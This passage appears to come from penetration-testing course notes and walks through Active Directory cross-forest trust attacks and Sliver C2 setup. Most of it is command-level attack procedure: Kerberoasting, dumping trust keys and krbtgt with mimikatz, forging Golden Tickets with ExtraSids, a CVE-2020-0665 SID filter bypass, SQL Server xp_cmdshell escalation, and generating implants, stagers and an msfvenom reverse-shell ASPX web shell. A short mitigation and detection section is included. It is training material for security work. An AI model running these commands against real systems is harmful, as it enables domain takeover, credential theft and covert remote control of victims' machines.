.\Rubeus.exe kerberoast /domain:logistics.ad
# Crack the TGS hashes
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
Note: Cross-forest Kerberoasting requires a bidirectional trust. With a one-way trust you can only kerberoast from the trusting direction (the domain that trusts the other allows requests, but cannot be targeted in reverse).
Methodology: Cross-Forest Kerberoasting
  • Confirm bidirectional forest trust with Get-ADTrust -Filter *
  • Run Rubeus.exe kerberoast /domain:<trusted-forest>
  • Crack hashes with hashcat -m 13100
  • Use cracked creds to enumerate or move laterally into the foreign forest

11.10 Trust Account Attack

Every interdomain trust creates a trust account (e.g., logistics$) whose password is stored in the LSA secrets on each DC. Dumping the trust key with lsadump::trust /patch yields credentials that allow direct authentication into the trusted domain - no Golden Ticket required.

11.10.1 Dump Trust Keys

# Connect to the attacker pivot (logistics DC)
proxychains ssh [email protected]

# Enumerate the trust to [domain]
Get-ADTrust -Identity [domain]

# Enumerate megacorp users (requires trust)
Get-ADUser Administrator -Server [domain]

# Run SharpHound against the trusted domain
.\SharpHound.exe -c All -d [domain]

# Dump trust keys from lsass (requires local admin on DC)
mimikatz # lsadump::trust /patch
# Locate the entry for [domain]; note the [ In ] RC4 key = trust password

11.10.2 Authenticate as Trust Account

# Use the RC4 trust key as the logistics$ account's password hash
.\Rubeus.exe asktgt /user:logistics$ /domain:[domain] /rc4:68e456d3a95cc748ac5a2eae679b9c91 /ptt

# Verify
klist

# With ticket in memory, kerberoast the target domain
.\Rubeus.exe kerberoast /domain:[domain]

# Crack the service ticket
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O

# Use cracked credentials to get a session on the target DC
.\Rubeus.exe asktgt /user:[user] /password:<cracked_password> /domain:[domain] /ptt
New-PSSession DC03.[domain]
Enter-PSSession DC03.[domain]
Methodology: Trust Account Attack
  • Run mimikatz lsadump::trust /patch on a DC to dump trust keys
  • Identify the trust account name (e.g., logistics$) and its RC4 key
  • Authenticate into the trusted domain with Rubeus asktgt /rc4:<key>
  • Use the trust account ticket to enumerate and kerberoast the trusted domain
  • Crack hashes; authenticate with cracked creds for interactive session

11.11 Unconstrained Delegation Cross-Forest

When a forest trust has TGT delegation enabled, unconstrained delegation on a host in the trusting forest can capture TGTs from the trusted forest - enabling cross-forest DCSync.

11.11.1 Attack: Printer Bug Across Forest Trust

# On [domain] host with unconstrained delegation, monitor for TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

# Trigger logistics.ad DC (dc02.logistics.ad) to authenticate to the [domain] DC
.\SpoolSample.exe dc02.logistics.ad [dc].[domain]

# Rubeus captures the dc02.logistics.ad$ TGT; inject it
.\Rubeus.exe renew /ticket:<base64_TGT> /ptt

# Verify ticket
klist

# DCSync the logistics domain using the DC machine TGT
.\mimikatz.exe "lsadump::dcsync /domain:logistics.ad /user:logistics\krbtgt" exit
Note: TGT delegation across a forest trust requires the trust to have the TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION flag set. This is a non-default configuration but is present in some environments.
Methodology: Unconstrained Delegation Cross-Forest
  • Confirm forest trust has TGT delegation enabled (TrustAttributes flag)
  • Identify a host with unconstrained delegation in the trusting forest
  • Start Rubeus monitor on the unconstrained delegation host
  • Trigger Printer Bug against the foreign forest DC
  • Inject captured TGT; run DCSync against the foreign forest

11.12 SID History Injection Attack

SID History is an attribute on AD accounts that preserves old SIDs after migration. If abused, it allows an attacker to embed privileged SIDs into a ticket and gain access matching those historical groups. Two exploitation cases exist depending on trust attributes.

11.12.1 Case 1: High-Privileged Migrated User

A user migrated from the trusted forest retains SID History entries pointing to high-privilege groups. Any account with that SID History inherits those privileges when authenticating across the trust.

# Find users with SID History in the current domain
Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory

# Reset password for the identified user (sentinal)
net user sentinal sentinal

# Create isolated logon session
.\Rubeus.exe createnetonly /program:powershell.exe /show

# In the new session, request TGT for sentinal
.\Rubeus.exe asktgt /user:sentinal /password:sentinal /domain:[domain] /ptt

# Access the logistics DC directly (SID history grants DA rights in logistics)
Enter-PSSession DC02.logistics.ad

11.12.2 Case 2: Low-Privileged User with TREAT_AS_EXTERNAL

When the forest trust has the TREAT_AS_EXTERNAL attribute, SID filtering is relaxed to match external-trust behavior - allowing ExtraSids abuse across a forest trust boundary.

# Confirm TREAT_AS_EXTERNAL is set on the logistics.ad trust
Get-DomainTrust -Domain logistics.ad
Get-DomainTrust -Domain logistics.ad | Where-Object {$_.TargetName -eq "[domain]"} | Select TrustAttributes

# Enumerate logistics domain for group targets
.\SharpHound.exe -c All -d logistics.ad

# Dump krbtgt for [domain] (already compromised)
.\mimikatz.exe "lsadump::dcsync /user:[DOMAIN]\[user]" exit

# Get [domain] domain SID
Get-DomainSID   # S-1-5-21-2432454459-173448545-3375717855

# Get the target group SID in logistics.ad (e.g., Infrastructure group)
Get-ADGroup -Identity "Infrastructure" -Server "logistics.ad"
# SID: S-1-5-21-186204973-2882451676-2899969076-2602

# Forge Golden Ticket with Infrastructure group SID as ExtraSid
.\Rubeus.exe golden /rc4:119885a9af438d1ef0d7543bed8b9ea1 `
  /domain:[domain] `
  /sid:S-1-5-21-2432454459-173448545-3375717855 `
  /sids:S-1-5-21-186204973-2882451676-2899969076-2602 `
  /user:jimmy /ptt

# Alternatively with Mimikatz
mimikatz # kerberos::golden /user:jimmy /domain:[domain] `
  /sid:S-1-5-21-2432454459-173448545-3375717855 `
  /sids:S-1-5-21-186204973-2882451676-2899969076-2602 `
  /krbtgt:119885a9af438d1ef0d7543bed8b9ea1 /ptt

# Verify and access the logistics DC
klist
dir \\DC02.logistics.ad\c$
Methodology: SID History Injection
  • Enumerate SIDHistory on all users: Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory
  • Case 1: Identify high-privileged SIDHistory; reset password; authenticate across trust
  • Case 2: Check trust attributes for TREAT_AS_EXTERNAL
  • Case 2: DCSync for krbtgt; collect child SID and target group SID in trusted domain
  • Forge Golden Ticket with group SID as /sids: value; inject; access trusted domain DC

11.13 SID Filter Bypass (CVE-2020-0665)

CVE-2020-0665 is a privilege escalation flaw in AD forest trusts. An attacker with full control over Forest A can inject the local domain SID of a member server in Forest B into a subdomain of Forest A. After the 24-hour NetrGetForestTrustInformation propagation cycle, Forest B trusts the injected SID, allowing a Golden Ticket that includes the local Administrator SID (RID 500) of that server.

11.13.1 Attack Prerequisites

Requirement Detail
Two-way transitive trust between forests [domain] ↔ logistics.ad
Child domain exists in Forest A child.[domain]
At least one domain-joined member server in Forest B SQL02.logistics.ad (not a DC)
Full control over Forest A Domain Admin / Enterprise Admin in [domain]

11.13.2 Step 1 - Collect Required Data

# Get local SID of victim server (SQL02) in logistics.ad
proxychains python getlocalsid.py [domain]/[email protected] SQL02
# Found local domain SID: S-1-5-21-2327345182-1863223493-3435513819

# Get child domain SID (child.[domain])
proxychains lookupsid.py [domain]/[user]:'[password]'@[target-ip] | grep "Domain SID"
# S-1-5-21-3878752286-62540090-653003637

# Get [domain] domain SID
proxychains lookupsid.py [domain]/[user]:'[password]'@[target-ip] | grep "Domain SID"
# S-1-5-21-2432454459-173448545-3375717855

11.13.3 Step 2 - Get Inter-Realm Tickets

# Get GUID for the logistics.ad trust object
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' | Select name,objectguid
# logistics.ad  8d52f9da-361b-4dc3-8fa7-af5f282fa741

# DCSync the inter-realm key for logistics.ad using its GUID
.\mimikatz.exe "lsadump::dcsync /guid:{8d52f9da-361b-4dc3-8fa7-af5f282fa741}" "exit"
# Note RC4 key:   c586031a224f252a7c8a31a6d2210cc1
# Note AES256 key: 179e4ae68e627e1fd4014c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8

11.13.4 Step 3 - Convert SIDs to Binary

# Convert SID to binary representation for frida_intercept.py
input_string = 'S-1-5-21-2327345182-1863223493-3435513819'   # SQL02 local SID
prefix = 'S-1-5-21-'
components = input_string.split(prefix, 1)
if len(components) > 1:
    remaining_string = components[1]
    split_values = remaining_string.split('-')
    output_list = []
    for i in split_values:
        decimal_number = int(i)
        hexadecimal_value = hex(decimal_number)[2:].zfill(8)
        little = ' '.join([hexadecimal_value[j:j+2] for j in range(len(hexadecimal_value)-2, -2, -2)])
        bytes_list = little.split()
        formatted_bytes = ', '.join([f"0x{byte.upper()}" for byte in bytes_list])
        output_list.append(formatted_bytes)
    final_output = ', '.join(output_list)
    print("0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, " + final_output)
SID Binary Representation (first 12 constant bytes + sub-authority)
S-1-5-21-3878752286-62540090-653003637 (child domain) 0x01,0x04,...,0x1E,0x10,0x31,0xE7,0x3A,0x49,0xBA,0x03,0x75,0x0B,0xEC,0x26
S-1-5-21-2327345182-1863223493-3435513819 (SQL02 local) 0x01,0x04,...,0x1E,0x78,0xB8,0x8A,0xC5,0x88,0x0E,0x6F,0xDB,0xC7,0xC5,0xCC

11.13.5 Step 4 - Run Frida Intercept & Forge Ticket

# Elevate to SYSTEM on [domain] DC
.\PsExec.exe -s -i powershell.exe

# Run frida_intercept.py (keep in background) - replaces child domain SID with SQL02 local SID in
# every NetrGetForestTrustInformation response sent to logistics.ad
python frida_intercept.py lsass.exe
# Verify interception: logistics should now see SQL02's SID for child.[domain]
proxychains python gettrustinfo.py [domain]/logistics.ad@[dc] -hashes :c586031a224f252a7c8a31a6d2210cc1 -target [target-ip]
# SubAuthority should show: 21, 2327345182, 1863223493, 3435513819

# After 2 minutes (lab) / 24 hours (production), forge inter-realm Golden Ticket
# Append RID 500 to SQL02 local SID to target local Administrator
# Forge inter-realm Golden Ticket with SQL02 local Admin SID as ExtraSid
mimikatz # kerberos::golden /domain:[domain] `
  /sid:S-1-5-21-2432454459-173448545-3375717855 `
  /user:user1 /target:logistics.ad /service:krbtgt `
  /sids:S-1-5-21-2327345182-1863223493-3435513819-500 `
  /aes256:179e4ae68e627e1fd4014c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8
# Saves ticket.kirbi

# Use kekeo to exchange the inter-realm ticket for a CIFS service ticket on SQL02
kekeo # tgs::ask /tgt:ticket.kirbi /service:cifs/[email protected] /kdc:DC02.logistics.ad /ptt

# Access SQL02 as local Administrator
klist
dir \\SQL02.logistics.ad\c$
Note: This attack cannot compromise a Domain Controller in the trusted forest - DC local SAM accounts are only active in Directory Services Restore Mode. It targets domain-joined member servers and workstations only.
Methodology: SID Filter Bypass (CVE-2020-0665)
  • Confirm two-way transitive forest trust and existence of a child domain in Forest A
  • Collect: SQL02 local SID, child domain SID, Forest A domain SID, inter-realm AES256/RC4 keys
  • Convert SQL02 local SID and child domain SID to binary with Python script
  • Update frida_intercept.py with the two binary SIDs; run as SYSTEM on Forest A DC
  • Verify interception via gettrustinfo.py; wait for propagation
  • Forge inter-realm Golden Ticket with SQL02 local Admin SID (domain SID + -500)
  • Exchange with kekeo for CIFS ticket; access target member server

11.14 Abusing SQL Server Links

Cross-forest MSSQL linked servers allow SQL instances in different forests to query each other. Misconfigured login mappings (sysadmin pass-through or db_owner on a TRUSTWORTHY database) allow code execution on the linked server.

11.14.1 Enumerate SQL Server Links

# From Windows - PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLServerLink                                   # discover linked servers
Get-SQLQuery -Query "EXEC sp_helplinkedsrvlogin"    # list login mappings
# From Linux - Impacket mssqlclient.py
mssqlclient.py [email protected] -windows-auth
SQL> enum_links      # list linked servers and login mappings

11.14.2 Path 1: Direct Sysadmin Access (jimmy)

-- Verify sysadmin rights on linked server
SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')
-- Returns 1 = sysadmin

-- Enable xp_cmdshell on linked server
EXECUTE('sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT "SQL02\SQLEXPRESS"

-- Execute OS command
EXECUTE('xp_cmdshell "whoami"') AT "SQL02\SQLEXPRESS"
# From Linux (mssqlclient.py)
SQL ([domain]\[user]  guest@master)> use_link "SQL02\SQLEXPRESS"
SQL >"SQL02\SQLEXPRESS" (sa  dbo@master)> enable_xp_cmdshell
SQL >"SQL02\SQLEXPRESS" (sa  dbo@master)> xp_cmdshell whoami

11.14.3 Path 2: TRUSTWORTHY Database Escalation ([user])

-- Verify current login name on linked server
SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS", 'SELECT SUSER_NAME()')
-- Returns: htb-dbuser

-- Confirm only public role
SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')   -- 0
SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''public'')')    -- 1

-- Enumerate all databases
SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS", 'SELECT name FROM master.dbo.sysdatabases')

-- Find TRUSTWORTHY databases
SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS",
  'SELECT a.name, b.is_trustworthy_on FROM master..sysdatabases AS a
   INNER JOIN sys.databases AS b ON a.name = b.name')

-- Confirm db_owner on htb-reports
EXEC ('sp_helpuser') AT "SQL02\SQLEXPRESS"

-- Confirm sa owns htb-reports
SELECT * FROM OPENQUERY("SQL02\SQLEXPRESS",
  'SELECT name AS database_name, SUSER_NAME(owner_sid) AS owner, is_trustworthy_on AS TRUSTWORTHY FROM sys.databases')

-- Check RPC out enabled (required for stored procedure creation)
SELECT is_rpc_out_enabled FROM sys.servers WHERE name='SQL02\SQLEXPRESS'

-- Create stored procedure to escalate htb-dbuser to sysadmin (executes as OWNER = sa)
EXEC ('CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember ''htb-dbuser'',''sysadmin''') AT "SQL02\SQLEXPRESS"

-- Execute escalation procedure
EXEC ('sp_escalate; SELECT IS_SRVROLEMEMBER(''sysadmin''); SELECT SUSER_NAME()') AT "SQL02\SQLEXPRESS"

-- Enable xp_cmdshell and run OS command
EXECUTE('sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT "SQL02\SQLEXPRESS"
EXECUTE('xp_cmdshell "whoami"') AT "SQL02\SQLEXPRESS"
# From Linux (mssqlclient.py - [user])
SQL ([DOMAIN]\[user]-student  guest@msdb)> use_link "SQL02\SQLEXPRESS"
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> enum_db        # find TRUSTWORTHY databases
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> enum_users     # confirm db_owner on htb-reports

SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> USE "htb-reports"
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'htb-dbuser','sysadmin'
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> EXEC sp_escalate
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  dbo@msdb)> SELECT is_srvrolemember('sysadmin')   -- 1

SQL >"SQL02\SQLEXPRESS" (htb-dbuser  dbo@msdb)> exec master.dbo.sp_configure "show advanced options",1;RECONFIGURE;exec master.dbo.sp_configure "xp_cmdshell", 1;RECONFIGURE;
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  dbo@msdb)> exec master..xp_cmdshell "whoami"
Methodology: SQL Server Link Abuse
  • Enumerate links with Get-SQLServerLink or enum_links; check LocalLogin / RemoteLoginName
  • If sysadmin: enable xp_cmdshell directly via EXECUTE(…) AT "linked_server"
  • If public only: identify TRUSTWORTHY databases (is_trustworthy_on = 1)
  • Confirm db_owner on TRUSTWORTHY database and that owner is sa
  • Verify is_rpc_out_enabled; create sp_escalate stored procedure; execute to become sysadmin
  • Enable xp_cmdshell; execute OS commands as nt service\mssql$sqlexpress

11.15 Abusing Foreign Security Principals & ACLs (Cross-Forest)

In a cross-forest environment, users from Forest A can be members of Domain Local groups in Forest B (the only group scope that accepts cross-forest members). These memberships are represented by Foreign Security Principal (FSP) objects in the target domain's FSP container.

11.15.1 Enumerate FSPs and Foreign Group Memberships

Import-Module .\PowerView.ps1

# Find FSP objects in logistics.ad (shows SIDs of foreign users)
Get-DomainObject -LDAPFilter '(objectclass=ForeignSecurityPrincipal)' -Domain logistics.ad

# Resolve the SID to a username
ConvertFrom-SID S-1-5-21-2432454459-173448545-3375717855-3601
# [DOMAIN]\[user]

# Enumerate which groups in logistics.ad contain foreign members
Get-DomainForeignGroupMember -Domain logistics.ad
# MemberName = SID, GroupName = svc_admins

ConvertFrom-SID S-1-5-21-2432454459-173448545-3375717855-3601
# [DOMAIN]\[user] -> member of Logistics\svc_admins

11.15.2 Abuse Foreign Group Membership

# Create isolated logon session
.\Rubeus.exe createnetonly /program:powershell.exe /show

# Request TGT for the cross-forest group member (harry in [domain])
.\Rubeus.exe asktgt /user:harry /password:Password123 /domain:[domain] /ptt

# Access logistics.ad resource only available to svc_admins
klist
type \\DC02.logistics.ad\FSP_Flag\flag.txt

11.15.3 Abuse Foreign ACL - GenericAll on User

# Find ACLs held by a cross-forest user (ava from [domain]) on logistics.ad objects
$sid = Convert-NameToSid ava
Get-DomainObjectAcl -ResolveGUIDs -Identity * -Domain logistics.ad | Where-Object {$_.SecurityIdentifier -eq $sid}
# ava has GenericAll on jessica in logistics.ad

# Get TGT for ava
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe asktgt /user:ava /password:ava /domain:[domain] /ptt

# Reset jessica's password (GenericAll allows this)
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'Test@1234' -AsPlainText -Force
Set-DomainUserPassword -Identity jessica -AccountPassword $pass -Domain logistics.ad -Verbose

# Get TGT for jessica in logistics.ad
.\Rubeus.exe asktgt /user:jessica /password:'Test@1234' /domain:logistics.ad /ptt

# Access logistics.ad resources as jessica
klist
type \\DC02.logistics.ad\FSP_ACL\flag.txt
Methodology: Foreign Security Principals & ACLs (Cross-Forest)
  • Query FSP container in target domain; resolve SIDs with ConvertFrom-SID
  • Run Get-DomainForeignGroupMember to identify cross-forest group memberships
  • Run foreign ACL enumeration script against target domain
  • Create sacrificial session; request TGT for the foreign-ACL principal
  • Exploit GenericAll: reset password (Set-DomainUserPassword) or add to group
  • Collect TGT for newly compromised account; access target domain resources

11.16 Abusing PAM Trusts

A Privileged Access Management (PAM) trust is a one-way trust from a User/Production forest to a Bastion (Administrative) forest. Shadow Principals in the bastion forest are mapped to high-privilege SIDs (e.g., Enterprise Admins) in the user forest. Compromising the bastion forest gives immediate admin access to all managed user forests.

11.16.1 Enumerate Shadow Principals

# RDP into the bastion forest DC
xfreerdp /u:Administrator /p:'C0ntrol_center_adm!' /v:[target-ip] /dynamic-resolution

# Enumerate shadow principals in the bastion forest
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) `
  -Filter * -Properties * | Select Name, member, msDS-ShadowPrincipalSid | Format-List

# Output fields:
# Name                   = shadow principal name (e.g., Tom)
# member                 = bastion forest users in this shadow principal (e.g., Administrator)
# msDS-ShadowPrincipalSid = SID of the privileged group in the user forest (e.g., Enterprise Admins)

11.16.2 Access User Forest via Shadow Principal

# With shadow principal mapped to Enterprise Admins in eulogistics.corp,
# the bastion Administrator can directly access the user forest
whoami; hostname
# controlcenter\administrator / [dc]

ls \\DC-EU.eulogistics.corp\c$

11.16.3 Create New Shadow Principal (if none exist)

# Get the Enterprise Admins SID from the target user forest
$ShadowPrincipalSid = (Get-ADGroup -Identity 'Enterprise Admins' -Properties ObjectSID -Server eulogistics.corp).ObjectSID

# Shadow Principal container path
$Container = 'CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=controlcenter,DC=corp'

# Create the shadow principal object
New-ADObject -Type msDS-ShadowPrincipal -Name "Tom" -Path $Container `
  -OtherAttributes @{'msDS-ShadowPrincipalSid' = $ShadowPrincipalSid}

# Add bastion Administrator as a member of the shadow principal
Set-ADObject -Identity "CN=Tom,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=controlcenter,DC=corp" `
  -Add @{'member' = "CN=Administrator,CN=Users,DC=controlcenter,DC=corp"} -Verbose
Note: Shadow principals reside at CN=Shadow Principal Configuration,CN=Services,CN=Configuration in the bastion forest. The msDS-ShadowPrincipalSid attribute maps to the privileged group SID in the user forest, not the bastion forest.
Methodology: PAM Trust Abuse
  • Enumerate shadow principals with Get-ADObject -SearchBase "CN=Shadow Principal Configuration..."
  • Identify msDS-ShadowPrincipalSid - confirms which user-forest groups are mapped
  • If shadow principals exist: access user forest directly as bastion Administrator
  • If none exist: create shadow principal with Enterprise Admins SID from user forest; add member
  • Verify access to user forest DC (ls \\DC.userforest.corp\c$)

11.17 Trust Attack Mitigations & Detections

Defense-in-depth for AD trusts focuses on minimizing the attack surface at the trust boundary and detecting anomalous cross-domain authentication patterns.

11.17.1 Hardening Measures

Control Description Attack Mitigated
SID Filtering Enable on all external and forest trusts; strips foreign SIDs from PAC ExtraSids, SID History Injection, CVE-2020-0665
Selective Authentication Restrict which accounts can authenticate across a trust Reduces lateral movement surface; limits cross-forest enumeration
One-Way Trusts Prefer one-way over two-way trusts when full bidirectionality is not needed Cross-Forest Kerberoasting, Trust Account Attack
Non-Transitive Trusts Use non-transitive trusts to prevent trust-chaining CVE-2020-0665, transitive privilege escalation
Disable TGT Delegation Remove TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION on forest trusts Unconstrained Delegation Cross-Forest
Disable Print Spooler on DCs Stop and disable the Print Spooler service on all domain controllers Printer Bug / SpoolSample coercion
MFA on Domain Controllers Require MFA for RDP / WinRM access to DCs Credential-based lateral movement after trust compromise
Patch CVE-2020-0665 Apply February 2020 cumulative update SID Filter Bypass
Regular Trust Audits Review and remove unnecessary trusts; validate trust direction and attributes Reduces overall attack surface
Strong Password / Rotation for Trust Accounts Ensure trust account passwords rotate on schedule (default 30 days) Trust Account Attack

11.17.2 Detection: Event ID 4769

Event ID 4769 (Kerberos Service Ticket Request) is the primary indicator for cross-trust authentication. Filter for tickets where the Account Domain field references a different forest than the Service Name.

# Filter Event Viewer for cross-forest TGT requests (run on each DC)
# Event Viewer > Windows Logs > Security > Filter Current Log > Event ID: 4769
# Look for: Account Domain = [domain] ; Service Name = DC02$ (in logistics.ad)
# This indicates a cross-forest Kerberos ticket request
Event ID What to Look For Attack Indicated
4769 Account Domain != Service Name domain (cross-forest) Cross-forest trust exploitation, foreign group abuse
4769 Unusual SPN requests from child domain accounts Trust Account Attack, Cross-Forest Kerberoasting
4672 Special privileges assigned to foreign principals Foreign ACL/group privilege escalation
4624 / 4648 Explicit logons from cross-forest accounts to DCs Pass-the-Ticket, Golden Ticket with ExtraSids
Note: Microsoft Sentinel with Kusto Query Language (KQL) enables automated detection of cross-trust enumeration patterns across large environments. Manual Event Viewer filtering is viable for targeted investigation on individual DCs.

12. C2 Operations with Sliver

12.1 Introduction to C2 and Sliver

A command and control (C2) server provides centralized management for executing commands on remote machines. An operator manages the software and carries out the simulated attack. Access can be gained via SQL injection, weak credentials (SSH, RDP), or a provided foothold for red team engagements.

Sliver is a C2 framework developed by BishopFox. Its client, server, and implants are written in Go, enabling easy cross-compilation for Windows, Linux, and macOS.

TermDefinition
ImplantBinary used to preserve access, facilitated by the C2 server
BeaconImplant that communicates to the C2 at a set interval
SessionInteractive implant with immediate command execution
StagerSmall loader that downloads and executes a full implant
CallbackTerm for when an implant is executed and communicates back to the server
ArmoryLibrary of precompiled .NET binaries executable on target machines

12.1.1 Cyber Kill Chain

PhaseDescription
ReconnaissanceActive and passive information gathering about the target
WeaponizationDeveloping the payload for foothold access
DeliveryTransferring the payload to the target
ExploitationExecuting the payload on the target
InstallationEstablishing initial control over the target
Command & ControlEstablishing a connection from target to C2 server
Actions on ObjectivesCarrying out intended goals: data theft, exfiltration, etc.
Note: The Cyber Kill Chain does not explicitly address OpSec. Minimizing footprint is a separate discipline that must be layered on top of every phase.

12.2 Installation and Setup

Sliver separates into a server component (handles callbacks and multi-operator) and a client component (operator interface). Using the standalone client/server approach avoids losing beacon sessions if the process is killed via Ctrl+C.

12.2.1 Server Setup

# Download and start Sliver server
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x ./sliver-server_linux
./sliver-server_linux

On first launch, Sliver unpacks assets (may take a few minutes). The server prompt prefix is [server] sliver >.

12.2.2 Operator Profile and Multiplayer Mode

Generate a client config file with new-operator, then enable multiplayer so clients can connect over the network.

# Generate operator config (run on server)
[server] sliver > new-operator -n student -l [target-ip]

# Enable multiplayer mode (required before clients can connect)
[server] sliver > multiplayer

12.2.3 Client Setup

# Download client, import config, connect
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
chmod +x ./sliver-client_linux
./sliver-client_linux import student_[target-ip].cfg
./sliver-client_linux

Client prompt prefix is sliver > (no server tag).

  • Download and start the Sliver server: 
    wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x ./sliver-server_linux
./sliver-server_linux
  • Generate operator config and enable multiplayer: 
    [server] sliver > new-operator -n student -l [target-ip]
[server] sliver > multiplayer
  • Install and connect the client: 
    wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
chmod +x ./sliver-client_linux
./sliver-client_linux import student_[target-ip].cfg
./sliver-client_linux

12.3 Armory

The Armory provides precompiled .NET binaries and BOF extensions that execute in-memory on targets. Install with armory install.

# List available packages
sliver > armory

# Install a single tool
sliver > armory install seatbelt

# Install all extensions (~20 aliases + 106 extensions)
sliver > armory install all

Key tools used throughout the module:

ToolPurpose
seatbeltSystem enumeration (C# port of PowerUp/host recon)
sharpupPrivilege escalation checks (PowerUp equivalent)
rubeusKerberos ticket manipulation and attacks
sharp-hound-4BloodHound ingestor
sharpview.NET port of PowerView for AD enumeration
sharpshPowerShell runner using RunSpaceFactory
certifyADCS certificate template enumeration and exploitation
inline-execute-assemblyExecute .NET assemblies in the current process (coff-loader)
c2tc-domaininfoDomain information via BOF/coff-loader
c2tc-kerberoastKerberoasting via BOF/coff-loader
delegationbofEnumerate Kerberos delegation configurations
nanodumpLSASS memory dump (coff-loader)
bof-roastBOF for SPN-based ticket retrieval
sharpersistPersistence via scheduled tasks, registry, startup folder
chiselTCP tunneling (requires manual extension install)

12.4 Implants, Beacons, and Listeners

12.4.1 Beacon vs Session

ModeBehaviorCLI Color
BeaconPolls at intervals; commands queued and executed at check-inBlue
SessionInteractive; commands execute immediatelyRed

Beacons can be upgraded to sessions with the interactive command.

12.4.2 Generating Implants

# Non-obfuscated HTTP beacon (smaller, detectable via strings)
sliver > generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows

# Obfuscated HTTP beacon (larger, harder to detect)
sliver > generate beacon --http 127.0.0.1 -N http_beacon_obfuscated --os windows

# Check sizes
ls -lh /home/htb-ac-8414/http_beacon.exe              # ~11MB
ls -lh /home/htb-ac-8414/http_beacon_obfuscated.exe   # ~17MB
Note: --skip-symbols disables symbol obfuscation. The binary will expose Sliver-specific imports in plaintext (visible via strings). Omit this flag for operational use.
# Verify strings leakage on non-obfuscated binary
strings http-beacon-skipSymbols.exe | grep sliver | tail -10

12.4.3 Key Generation Flags

FlagPurpose
-J / --jitterJitter time for callback interval fluctuation
-S / --secondsCallback interval in seconds (default: 60)
--skip-symbolsDisable symbol obfuscation (faster build, smaller binary)
-NName for the implant binary
--osTarget OS (windows, linux, darwin)
--format / -fOutput format: exe, shared, service, shellcode
-e / --evasionEnable evasion features (overwrite user-space hooks)
--httpHTTP C2 callback address
-iNamed pipe / TCP pivot address

12.4.4 Starting Listeners

# HTTP listener
sliver > http --lport 8088

# HTTPS listener with bind address
sliver > https -L [target-ip] -l 8088

# List running listeners/jobs
sliver > jobs

12.4.5 Named Pipe Pivots

Named pipes follow the format \\ServerName\pipe\PipeName. In Sliver, pipe pivots are Windows-only and used for internal lateral movement in restricted environments.

# Enumerate named pipes on Windows
ls \\.\pipe\
# Start a named pipe pivot listener on an established session
[server] sliver (http_beacon) > pivots named-pipe --bind academy

# Generate a pivot implant pointing to the named pipe
sliver > generate --named-pipe 127.0.0.1/pipe/academy -N pipe_academy --skip-symbols
Note: Use HTTPS, mTLS, or WireGuard listeners for operational security. The HTTP C2 profile at ~/.sliver/config/http-c2.json can be customized (headers, filenames, URL patterns) to blend traffic with legitimate services.

12.5 Initial Foothold via Web Application

The lab scenario targets a Windows/IIS/ASP.NET application with an unrestricted file upload. The attack chain uses a stager: upload an ASPX web shell that loads the Sliver implant.

12.5.1 Stager Setup

# 1. Create an implant profile (shellcode format for staging)
sliver > profiles new --http [target-ip]:8088 --format shellcode htb

# 2. Start a TCP stage listener
sliver > stage-listener --url tcp://[target-ip]:4443 --profile htb

# 3. Start the HTTP callback listener
sliver > http -L [target-ip] -l 8088

# 4. Generate stager payload bytes (CSharp format)
sliver > generate stager --lhost [target-ip] --lport 4443 --format csharp --save staged.txt
# Generate an ASPX wrapper with msfvenom
msfvenom -p [password]/shell/reverse_tcp LHOST=[target-ip] LPORT=4443 -f aspx > sliver.aspx

Replace the byte[] mO0UY array in the generated sliver.aspx with the bytes from staged.txt, then upload via the application's file upload functionality.

12.5.2 Session Management

# List active sessions
sliver > sessions

# Interact with a session (supports TAB completion)
sliver > use 06ff8ed9-5a6b-4eca-ba88-7b49e8637dd3

# View session info
sliver (HIGH_RISER) > info
# List beacons
sliver > beacons

# View pending/completed beacon tasks
sliver (beacon) > tasks

